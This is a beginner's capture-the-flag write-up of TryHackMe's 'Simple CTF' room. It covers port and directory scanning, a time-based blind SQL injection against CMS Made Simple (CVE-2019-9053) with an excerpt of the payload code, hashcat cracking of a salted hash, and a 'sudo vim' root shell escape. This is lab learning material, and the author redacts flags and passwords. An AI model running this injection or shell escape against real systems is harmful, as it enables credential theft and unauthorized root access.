# Simple CTF — TryHackMe

[🇧🇷 Versão em português](README.pt-BR.md)

> **Category:** `Web` · `Linux`
> **Difficulty:** 🟢 Easy
> **Points:** `300 pts`
> **Date:** 2026-04-16
> **Challenge author:** `MrSeth6797`

> ⚠️ **Note:** flags, passwords and hashes are intentionally omitted, in line with TryHackMe's Acceptable Use Policy. This write-up focuses on methodology and reasoning.

---

## TL;DR

> The challenge exposes a CMS vulnerable to time-based SQL injection (CVE-2019-9053). I extracted credentials with an exploit adapted to Python 2, cracked the hash with hashcat, and escalated privileges through `sudo vim` to get root access.

---

## 📌 Description

> Beginner level ctf

**Target:**
- IP: `10.64.161.157` (changes on every session)
- URL: `http://10.64.161.157`

---

## 🔍 Reconnaissance

I only had the machine's IP, so I started with nmap to see which ports were open and plan an approach around them.

```bash
# port enumeration with nmap
nmap -sV -sC -Pn -oN nmap.txt 10.64.161.157

# output
21/tcp   (FTP)  - vsftpd 3.0.3
80/tcp   (HTTP) - Apache 2.4.18 (Ubuntu)
2222/tcp (SSH)  - OpenSSH 7.2p2
```

```bash
# directory enumeration with gobuster
gobuster dir -u http://10.64.161.157 -w /usr/share/wordlists/dirb/common.txt

# output
robots.txt   (Status: 200)
simple       (Status: 301) [--> http://10.64.161.157/simple/]
```

**Relevant observations:**
- FTP allows anonymous login and transmits in clear text (no encryption)
- Directory listing over FTP failed (possible restriction)
- `robots.txt` mentions a sensitive directory (`/openemr-5_0_1_3`). Access was unsuccessful
- SSH on a non-standard port (2222)
- Gobuster found the `/simple/` directory

---

## 🧠 Reasoning

After reading the nmap output, I decided to start with the web page and look for a vulnerability. Inside `/simple/`, I found the CMS name and version: CMS Made Simple v2.2.8. I ran `searchsploit cms made simple` on Kali and found a SQL injection vulnerability.

When I ran the exploit, I hit a problem with the `termcolor` library and the Python version it was written for, so I adapted the code: I removed the library and adjusted it to Python 2. The attack returned 3 important pieces of data: username, password hash and salt.

This part confused me the most. `hash-identifier` suggested two possible types for the salt (MD5 and MySQL) and MD5 for the password hash. I wasn't sure whether the type mattered for cracking, but from my research I could use hashcat or John the Ripper, and I preferred hashcat.

After cracking the hash, I guessed the password would work over SSH. It did. In the user's home directory I found `user.txt`. Next, I suspected the other flag was in root's directory, so I ran `sudo -l` to see which binaries the user could run with sudo, and `/usr/bin/vim` was allowed. I researched it and escalated privileges with `sudo vim -c ':!/bin/bash'`. The root prompt appeared, and the last flag was in root's directory.

---

## 🛠️ Exploitation

### Step 1 — SQL injection

The exploit uses time-based (*blind*) SQL injection: it injects a conditional `sleep()` into the query and recovers the password one character at a time.

```bash
python2 exploit2.py -u http://10.64.161.157/simple/
```

Exploit excerpt (injection logic):

```python
payload = (
    "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")"
    "+from+cms_users"
    "+where+password+like+0x" + ord_password_temp + "25"
    "+and+user_id+like+0x31)+--+"
)

url = url_vuln + "&m1_idlist=" + payload

start_time = time.time()
r = session.get(url)
elapsed_time = time.time() - start_time

# If the server took >= TIME seconds, the character is correct
if elapsed_time >= TIME:
    password = temp_password  # confirm the character and move on
```

**Output:**
```
Salt for password found: <redacted>
Username: mitch
Email found: admin@admin.com
Password found: <redacted hash>
```

---

### Step 2 — Cracking the hash

The hash is salted (`md5(salt + password)`), so I used hashcat mode `20`, passing `hash:salt`:

```bash
hashcat -m 20 <hash>:<salt> /usr/share/wordlists/rockyou.txt
```

**Output:**
```
<hash>:<salt>:<redacted>
```

---

### Step 3 — SSH access and privilege escalation

```bash
ssh -p 2222 mitch@10.64.161.157
```

Once inside, I ran `sudo -l` to list what the user could run with sudo. The output included `/usr/bin/vim`.

```bash
sudo vim -c ':!/bin/bash'
```

With a root shell, I read both flag files (`user.txt` in the user's home and `root.txt` in root's directory).

---

## 🚩 Flags

- `user.txt`: omitted per TryHackMe's policy
- `root.txt`: omitted per TryHackMe's policy

---

## 📚 Concepts and techniques

| Concept / Tool | How it was used |
|---|---|
| Time-based (blind) SQL injection | The exploit injects a conditional `sleep()` into the query. If the server takes >= N seconds to respond, the tested character is correct. Data comes out one character at a time, with no direct output in the HTTP response. CVE-2019-9053, `m1_idlist` parameter of CMS Made Simple's News module. |
| Hashcat (mode 20, salted MD5) | Offline cracking of the password hash, supplying the salt together with the hash. |
| GTFOBins / `sudo vim` | Binaries allowed through sudo can be abused to escape to a shell. Vim can run external commands with `:!/bin/bash`, resulting in a root shell. |

---

## 🔗 References

- [CVE-2019-9053](https://www.exploit-db.com/exploits/46635)
- [GTFOBins / Vim](https://gtfobins.org/gtfobins/vim/)

---

## 💬 Final thoughts

It was a relatively simple challenge, but I struggled in places because I don't have much CTF experience yet. Nothing that keeps me from continuing to grow and improve. Since this was my first solved challenge, I will keep what I learned here with great fondness.

---

<div align="center">
  <sub>Write-up by <a href="https://github.com/BrennoSantAnna">@BrennoSantAnna</a> · <a href="https://linkedin.com/in/brennosantanna">LinkedIn</a></sub>
</div>
